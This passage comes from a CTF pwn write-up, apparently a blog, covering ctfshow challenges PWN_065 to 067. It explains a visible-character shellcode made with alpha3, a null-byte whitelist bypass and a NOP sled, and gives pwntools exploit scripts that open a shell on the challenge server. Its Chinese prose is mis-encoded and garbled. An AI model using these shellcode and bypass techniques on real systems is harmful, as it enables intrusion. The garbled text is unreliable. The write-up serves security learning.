</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000000011</span><span class="nf">E9</span>                 <span class="nv">jle</span>     <span class="nv">short</span> <span class="nv">loc_11FC</span>  <span class="o">//</span> <span class="err">å­—ç¬¦â‰¤</span><span class="mh">0x40</span> <span class="err">â†’</span> <span class="err">è¿›å…¥ä¸‹ä¸€è½®æ ¡éªŒ</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000000011</span><span class="nf">F8</span>                 <span class="nv">cmp</span>     <span class="nb">al</span><span class="p">,</span> <span class="mh">5Ah</span> <span class="c1">; &#39;Z&#39;  // è¾¹ç•Œ2ï¼š0x5A</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000000011</span><span class="nf">FA</span>                 <span class="nv">jle</span>     <span class="nv">short</span> <span class="nv">loc_1236</span>  <span class="o">//</span> <span class="err">å­—ç¬¦â‰¤</span><span class="mh">0x5A</span> <span class="err">â†’</span> <span class="err">é€šè¿‡æ ¡éªŒ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.ç¬¬ä¸‰ç»„èŒƒå›´æ ‡è¯†ï¼šå…è®¸ <code>0x2F~0x3F</code>ï¼ˆå¯¹åº” ASCII &lsquo;/&rsquo;~&rsquo;?&rsquo;ï¼‰</p>
<p>å¯¹åº”ä»£ç æ®µï¼ˆ<code>loc_11FC</code>è‡³<code>loc_1236</code>ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000001209</span>                 <span class="nf">cmp</span>     <span class="nb">al</span><span class="p">,</span> <span class="mh">2Fh</span> <span class="c1">; &#39;/&#39;  // è¾¹ç•Œ1ï¼š0x2F</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000000120</span><span class="nf">B</span>                 <span class="nv">jle</span>     <span class="nv">short</span> <span class="nv">loc_121E</span>  <span class="o">//</span> <span class="err">å­—ç¬¦â‰¤</span><span class="mh">0x2F</span> <span class="err">â†’</span> <span class="err">é”™è¯¯ï¼ˆé€€å‡ºï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000000121</span><span class="nf">A</span>                 <span class="nv">cmp</span>     <span class="nb">al</span><span class="p">,</span> <span class="mh">5Ah</span> <span class="c1">; &#39;Z&#39;  // è¾¹ç•Œ2ï¼š0x5A</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000000121</span><span class="nf">C</span>                 <span class="nv">jle</span>     <span class="nv">short</span> <span class="nv">loc_1236</span>  <span class="o">//</span> <span class="err">å­—ç¬¦â‰¤</span><span class="mh">0x5A</span> <span class="err">â†’</span> <span class="err">é€šè¿‡æ ¡éªŒ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»¼ä¸Šï¼šè¿™æ®µæ±‡ç¼–é€šè¿‡ <strong><code>cmp al, 60h</code>ã€<code>cmp al, 7Ah</code>ã€<code>cmp al, 40h</code>ã€<code>cmp al, 5Ah</code>ã€<code>cmp al, 2Fh</code></strong> è¿™ 5 å¤„<code>cmp</code>æŒ‡ä»¤ï¼Œæ˜ç¡®æ ‡è¯†äº†è¾“å…¥å­—ç¬¦çš„å…è®¸èŒƒå›´ï¼ˆ<code>0x2F~0x5A</code> æˆ– <code>0x60~0x7A</code>ï¼‰ã€‚å…¶å®å°±æ˜¯è¦æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œshellcode æœ‰äº›æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œè¿™ä¸ªå«<strong>string.printable</strong>ï¼Œå°±æ˜¯å¯è§å­—shellcodeã€‚è¿™é‡Œä½¿ç”¨<code>alpha3</code>å°±å¯ä»¥ç”Ÿæˆäº†:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/TaQini/alpha3.git
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆšå¥½pwntoolsçš„shellcodeæ˜¯æœ‰ä¸å¯æ‰“å°çš„å­—ç¬¦ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>jhh///sh/bin\x89ï¿½h\x814$ri1ï¿½Qj\x04ï¿½Qï¿½ï¿½1ï¿½j\x0bÍ€</code></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/218.png"
	width="871"
	height="55"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/218_hu_dead02297c5d775a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/218_hu_ea0a8deb66a09465.png 1024w"
	loading="lazy"
	
		alt="shellcodeæœ‰ä¹±ç "
	
	
		class="gallery-image" 
		data-flex-grow="1583"
		data-flex-basis="3800px"
	
></p>
<p>å°†shellcodeé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ åˆ‡æ¢åˆ°alpha3ç›®å½•ä¸­ï¼Œä½¿ç”¨alpha3ç”Ÿæˆstring.printable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cd</span> <span class="n">alpha3</span>
</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="o">./</span><span class="n">ALPHA3</span><span class="o">.</span><span class="n">py</span> <span class="n">x64</span> <span class="n">ascii</span> <span class="n">mixedcase</span> <span class="n">rax</span> <span class="o">--</span><span class="nb">input</span><span class="o">=</span><span class="s2">&#34;å­˜å‚¨shellcodeçš„æ–‡ä»¶&#34;</span> <span class="o">&gt;</span> <span class="n">è¾“å‡º</span>
</span></span><span class="line"><span class="cl"><span class="n">æ–‡ä»¶</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŠŠè¾“å‡ºçš„shellcodeå¯è§å­—ç¬¦ä¸²ç²˜è´´åˆ°expä¸Šçš„å˜é‡ã€‚</p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28125</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Shellcode&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_066">PWN_066
</h3><p>é¢˜ç›®ï¼šç®€å•çš„shellcodeï¼Ÿä¸å¯¹åŠ²ï¼Œååˆ†å¾—æœ‰åäºŒåˆ†çš„ä¸å¯¹åŠ²ã€‚</p>
<p>checksecã€IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/223.png"
	width="743"
	height="360"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/223_hu_afd71517e93ebe2c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/223_hu_dbb097a6028a9ea3.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="495px"
	
></p>
<p>çœ‹åˆ°äº†ç†Ÿæ‚‰çš„mmapå‡½æ•°ï¼›bufå­˜åœ¨æº¢å‡ºç‚¹ï¼Œå¾€bufé‡Œå†™å…¥shellcodeï¼Œç„¶åç¨‹åºä¼šæ‰§è¡Œshellcodä½†æ˜¯æœ‰ä¸€ä¸ªcheckå‡½æ•°ï¼Œè·Ÿè¿›æŸ¥çœ‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/234.png"
	width="621"
	height="288"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/234_hu_32b208621f405438.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/234_hu_6044adf69ba41af8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="215"
		data-flex-basis="517px"
	
></p>
<p><code>check</code>å‡½æ•°çš„ä½œç”¨æ˜¯ï¼šéªŒè¯è¾“å…¥å­—ç¬¦ä¸²a1ä¸­çš„æ¯ä¸ªå­—ç¬¦æ˜¯å¦éƒ½å±äº<code>unk_400F20</code>æŒ‡å‘çš„å…è®¸å­—ç¬¦é›†ã€‚</p>
<p>ç»§ç»­è·Ÿè¿›unk_400F20ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/235.png"
	width="899"
	height="560"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/235_hu_3dec90b968dc9972.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/235_hu_34c6842586e5580d.png 1024w"
	loading="lazy"
	
		alt="unk_400F20"
	
	
		class="gallery-image" 
		data-flex-grow="160"
		data-flex-basis="385px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/236.png"
	width="729"
	height="475"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/236_hu_32f8ca70634168cf.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/236_hu_a1d682be0ebede7.png 1024w"
	loading="lazy"
	
		alt="shift &#43; e"
	
	
		class="gallery-image" 
		data-flex-grow="153"
		data-flex-basis="368px"
	
></p>
<p>æˆ‘ä»¬è¾“å…¥çš„shellcodeçš„æ¯ä¸€ä½å­—ç¬¦è¦åœ¨unk_400F20ä¸­ï¼Œæ£€æŸ¥çš„æ—¶å€™*j==0ä¼šé€€å‡ºï¼Œå¯ä»¥ä½¿ç”¨\x00æ¥çªç ´ç¨‹åºé˜Ÿshellcodeçš„<code>å­—ç¬¦ç™½åå•æ ¡éªŒ</code>ï¼›è€Œå¸¸è§„çš„<code>shellcraft.sh()</code>ç”Ÿæˆçš„ shellcode åŒ…å«å¤§é‡ç™½åå•å¤–å­—ç¬¦ï¼ˆå¦‚<code>\x3b</code>ã€<code>\x0f</code>ç­‰ï¼‰ï¼Œæ— æ³•ç›´æ¥é€šè¿‡æ ¡éªŒï¼Œå› æ­¤å¿…é¡»ç»•è¿‡ã€‚</p>
<p>å¦‚ä½•ç»•è¿‡ä»checkå‡½æ•°ä¸‹æ‰‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/237.png"
	width="620"
	height="281"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/237_hu_3dfef3f5acc20542.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/237_hu_113bba7bb71263d7.png 1024w"
	loading="lazy"
	
		alt="çªç ´ç‚¹"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="529px"
	
></p>
<p>çœ‹åˆ°è¿™é‡Œä½ ä¼šå‘ç°whileé‡Œé¢æ˜¯ä¸€ä¸ª<code>a1</code>å‚æ•°ï¼Œå¦‚æœæˆ‘è®©a1 == 0ï¼Œwhileçš„å¾ªç¯æ¡ä»¶ä¸æˆç«‹ï¼Œç›´æ¥é€€å‡ºå¾ªç¯ã€‚</p>
<p>æ‰€ä»¥expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28280</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00\xc0</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>\x00\xc0</code>æ˜¯ **â€œæˆªæ–­æ ¡éªŒ + åˆæ³•æ‰§è¡Œâ€ çš„åŒé‡å·¥å…· **ï¼š<code>\x00</code>è´Ÿè´£çªç ´<code>check</code>å‡½æ•°çš„é€å­—èŠ‚ç™½åå•é™åˆ¶ï¼Œ<code>\xc0</code>è´Ÿè´£ç¡®ä¿æŒ‡ä»¤åˆæ³•ä»¥é¿å…æ‰§è¡Œé”™è¯¯ï¼ŒäºŒè€…ç»„åˆæ˜¯è¯¥é¢˜ç›®ç»•è¿‡å­—ç¬¦åˆæ³•æ€§æ ¡éªŒã€æˆåŠŸæ‰§è¡Œ shellcode çš„æ ¸å¿ƒå…³é”®ã€‚</p>
<h3 id="nop-sledç©ºæ“ä½œé›ªæ©‡"><strong>nop sledç©ºæ“ä½œé›ªæ©‡</strong>
</h3><blockquote>
<p><strong>â€œnopâ€ï¼ˆNo Operation çš„ç¼©å†™ï¼‰</strong>ï¼šæ˜¯ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤ï¼Œåœ¨ 32 ä½ x86 æ¶æ„ä¸‹ï¼Œå…¶æœºå™¨ç ä¸º<code>0x90</code>ã€‚nop æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼ŒCPU ä¸è¿›è¡Œå®é™…çš„è¿ç®—æˆ–æ•°æ®å¤„ç†æ“ä½œï¼Œä»…å°†ç¨‹åºè®¡æ•°å™¨ï¼ˆå¦‚ 32 ä½æ¶æ„ä¸‹çš„ EIP å¯„å­˜å™¨ï¼‰çš„å€¼å¢åŠ  1ï¼ŒæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œèµ·åˆ°å ä½å’Œä½¿ç¨‹åºæµç¨‹é¡ºåºæ‰§è¡Œçš„ä½œç”¨ã€‚</p>
<p><strong>â€œsledâ€ï¼ˆé›ªæ©‡ï¼‰</strong>ï¼šå½¢è±¡åœ°æè¿°äº†æ”»å‡»åŸç†ã€‚é€šè¿‡åœ¨ shellcode å‰é¢å¡«å……å¤§é‡çš„ nop æŒ‡ä»¤ï¼Œå½¢æˆä¸€ä¸ª â€œæŒ‡ä»¤é›ªæ©‡â€ã€‚å½“ç¨‹åºçš„æ‰§è¡Œæµè¢«åŠ«æŒåˆ°è¿™ä¸ª â€œé›ªæ©‡â€ åŒºåŸŸå†…çš„ä»»æ„ä½ç½®æ—¶ï¼Œå°±åƒé›ªæ©‡ä»é«˜å¤„æ»‘ä¸‹ä¸€æ ·ï¼Œç¨‹åºä¼šé¡ºç€ä¸€ä¸ªä¸ª nop æŒ‡ä»¤ä¾æ¬¡æ‰§è¡Œï¼Œæœ€ç»ˆåˆ°è¾¾å¹¶æ‰§è¡Œä½äº â€œé›ªæ©‡â€ åæ–¹çš„ shellcodeã€‚è¿™ä¸€è¿‡ç¨‹å¯ç±»æ¯”ä¸ºåœ¨ä¸ç¡®å®š shellcode ç¡®åˆ‡èµ·å§‹åœ°å€çš„æƒ…å†µä¸‹ï¼Œæ‰©å¤§å¯å‘½ä¸­çš„èŒƒå›´ï¼Œåªè¦è¿”å›åœ°å€èƒ½è½å…¥ nop æŒ‡ä»¤ç»„æˆçš„åŒºåŸŸï¼Œå°±èƒ½ä¿è¯ shellcode è¢«æ‰§è¡Œã€‚</p>
</blockquote>
<h3 id="pwn_067">PWN_067
</h3><p>é¢˜ç›®ï¼š32bit nop sledï¼›</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/238.png"
	width="801"
	height="234"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/238_hu_e3f1d88191a0ef75.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/238_hu_19041a51464601be.png 1024w"
	loading="lazy"
	
		alt="æœ‰æ ˆæº¢å‡ºä¿æŠ¤"
	
	
		class="gallery-image" 
		data-flex-grow="342"
		data-flex-basis="821px"
	
></p>
<p>è¿™æ¬¡åªæœ‰æ ˆæº¢å‡ºä¿æŠ¤äº†ã€‚</p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/239.png"
	width="908"
	height="466"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/239_hu_55405d1133582b8d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/239_hu_befde81098e46521.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/240.png"
	width="1296"
	height="785"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/240_hu_ba20d400cc872dc.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/240_hu_66be74762e913a37.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="165"
		data-flex-basis="396px"
	
></p>
<p>è¿™ä¸ªv5åœ°å€è¢«æ‰“å°è¾“å‡ºï¼Œä½†ä¸€ç›´æ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚</p>
<p>ä»£ç çš„å¤§æ¦‚æ„æ€æ˜¯å…ˆè¾“å‡ºä¸€äº›ä¿¡æ¯ï¼Œç„¶åè¾“å‡ºçš„ä¼šæœ‰æ ˆä¸­çš„åœ°å€ï¼Œä»query_positionå‡½æ•°å¯ä»¥å‘ç°å‡½æ•°è¿”å›å€¼æ˜¯v1çš„åœ°å€åŠ ä¸Šv2çš„å€¼ï¼Œè€Œv1æ˜¯å±€éƒ¨å˜é‡ï¼Œé‚£ä¹ˆå®ƒçš„åœ°å€å°±æ˜¯æ ˆé‡Œçš„åœ°å€ï¼ŒåŠ ä¸Šv2å°±ä»£è¡¨æ¥æ”¶å‡½æ•°è¿”å›å€¼çš„å˜é‡position=v1çš„åœ°å€+v2çš„å€¼(å³&amp;v1+v2)ã€‚ç„¶åç¨‹åºä¼šè®©æˆ‘ä»¬è¾“å…¥å¤§å°ä¸º4096çš„å­—ç¬¦ä¸²ç»™seedå˜é‡ï¼Œä¹‹åå†è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œå°†å…¶èµ‹ç»™v5ï¼Œç„¶åä½¿ç”¨v5ä»æˆ‘ä»¬è¾“å…¥çš„è¿™ä¸ªåœ°å€æ‰§è¡Œè¿™ä¸ªåœ°å€çš„ä»£ç ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥ä»å †æ ˆä¸­æ‰§è¡Œã€‚å‘ç¨‹åºæä¾› shellcode å¾ˆå®¹æ˜“ï¼Œå› ä¸ºå®ƒåªè¦æ±‚è¾“å…¥ã€‚ç°åœ¨æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥è·³è½¬åˆ°æˆ‘ä»¬çš„shellcodeçš„åœ°å€ä»è€Œæ‰§è¡Œè¿™ä¸ªshellcodeã€‚</p>
<p>åˆšå¥½æœ‰ä¸ª fgets å¯ä»¥è¯»å– shellcode åˆ° seedï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“ seed çš„åœ°å€ã€‚</p>
<p>è·Ÿè¿›query_positionå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241.png"
	width="610"
	height="253"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241_hu_b76db1763bd6df64.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241_hu_5afb8f9679a37742.png 1024w"
	loading="lazy"
	
		alt="query_positionå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="241"
		data-flex-basis="578px"
	
></p>
<p><code>char *query_position()</code> ä½œç”¨æ˜¯<strong>ç”Ÿæˆä¸€ä¸ªåŸºäºéšæœºåç§»çš„æ ˆåœ°å€</strong>ï¼Œå¾—åˆ°ä¸€ä¸ª<strong>èŒƒå›´åœ¨-668åˆ° 668ä¹‹é—´</strong>çš„éšæœºæ•´æ•°ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡ v2 ä¸­ã€‚è¯¥åœ°å€åç»­ç”¨äºæ„é€  â€œnop é›ªæ©‡â€ æ”»å‡»ä»¥ç»•è¿‡æ ˆåœ°å€éšæœºæ€§ã€‚</p>
<p>çœ‹åˆ°è¿™é‡Œå°±æœ‰ç‚¹å°è±¡äº†ï¼Œè¿™ä¸å°±æ˜¯ç±»ä¼¼ASLRï¼ˆAddress Space Layout Randomizationï¼‰ä¿æŠ¤å—ï¼Ÿ</p>
<p>æˆ‘ä»¬è¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸‹ nop sled ç©ºæ“ä½œé›ªæ©‡ï¼š</p>
<p>æ”»å‡»è€…é€šè¿‡è¾“å…¥å­—ç¬¦ä¸²æ³¨å…¥æ”»å‡»ä»£ç ã€‚åœ¨å®é™…çš„æ”»å‡»ä»£ç å‰æ³¨å…¥å¾ˆé•¿çš„ nop æŒ‡ä»¤ï¼ˆæ— æ“ä½œï¼Œä»…ä½¿ç¨‹åºè®¡æ•°å™¨åŠ ä¸€ï¼‰åºåˆ—ï¼Œåªè¦ç¨‹åºçš„æ§åˆ¶æµæŒ‡å‘è¯¥åºåˆ—ä»»æ„ä¸€å¤„ï¼Œç¨‹åºè®¡æ•°å™¨é€æ­¥åŠ ä¸€ï¼Œç›´åˆ°åˆ°è¾¾æ”»å‡»ä»£ç çš„å­˜åœ¨çš„åœ°å€ï¼Œå¹¶æ‰§è¡Œã€‚ç”±äºæ ˆåœ°å€åœ¨ä¸€å®šèŒƒå›´çš„éšæœºæ€§ï¼Œæ”»å‡»è€…ä¸èƒ½å¤ŸçŸ¥é“æ”»å‡»ä»£ç æ³¨å…¥çš„åœ°å€ï¼Œè€Œè¦æ‰§è¡Œæ”»å‡»ä»£ç éœ€è¦å°†å‡½æ•°çš„è¿”å›åœ°å€æ›´æ”¹ä¸ºæ”»å‡»ä»£ç çš„åœ°å€ï¼ˆå¯é€šè¿‡ç¼“å†²åŒºæº¢å‡ºçš„æ–¹å¼æ”¹å†™å‡½æ•°è¿”å›åœ°å€ï¼‰ã€‚æ‰€ä»¥ï¼Œåªèƒ½åœ¨ä¸€å®šèŒƒå›´å†…ï¼ˆæ ˆéšæœºå¯¼è‡´æ”»å‡»ä»£ç åœ°å€ä¸€å®šèŒƒå›´å†…éšæœºï¼‰æšä¸¾æ”»å‡»ä»£ç ä½ç½®ï¼ˆæœ‰ä¾æ®çš„çŒœï¼‰ ã€‚</p>
<blockquote>
<p>ä¸ç”¨ nop sled ï¼Œ å‡½æ•°è¿”å›åœ°å€ &mdash;&mdash;-&gt; æ”»å‡»ä»£ç ã€‚</p>
<p>ä½¿ç”¨ nop sled ï¼Œ å‡½æ•°è¿”å›åœ°å€ &mdash;&mdash;-&gt; nop åºåˆ—ï¼ˆé¡ºåºæ‰§è¡Œï¼‰ ç›´åˆ°æ”»å‡»ä»£ç åœ°å€ã€‚</p>
</blockquote>
<p>ä¸ºäº†å®‰å…¨åœ°â€œç»•è¿‡â€ä¸çŸ¥é“ç¼“å†²åŒºçš„ç¡®åˆ‡å¼€å§‹ä½ç½®,æˆ‘ä»¬å¯ä»¥ï¼š</p>
<p>1ã€å°† shellcode å¡«å……ä¸ºä»¥ 1336 nop æ¡æŒ‡ä»¤å¼€å¤´ ( 0x90 )ã€‚</p>
<p>2ã€ä½¿ç”¨ çš„è¿”å›å€¼ query_position ï¼Œæ·»åŠ  0x2d ï¼ˆå¦‚å‰æ‰€è¿°ï¼‰ï¼Œ<strong>ç„¶åæ·»åŠ </strong> <strong>668</strong>ã€‚</p>
<p>python3è¿è¡Œçš„expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28152</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
